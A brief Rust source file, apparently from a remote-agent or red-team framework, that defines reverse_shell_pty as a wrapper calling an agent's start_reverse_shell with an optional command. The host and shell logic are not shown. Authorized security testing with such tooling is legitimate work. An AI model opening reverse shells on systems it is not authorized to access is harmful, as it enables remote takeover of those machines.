use alloc::string::String;
use alloc::sync::Arc;
use anyhow::Result;
use eldritch_agent::{Agent, TaskContext};

pub fn reverse_shell_pty(
    agent: Arc<dyn Agent>,
    task_context: TaskContext,
    cmd: Option<String>,
) -> Result<()> {
    agent
        .start_reverse_shell(task_context, cmd)
        .map_err(|e| anyhow::anyhow!(e))
}
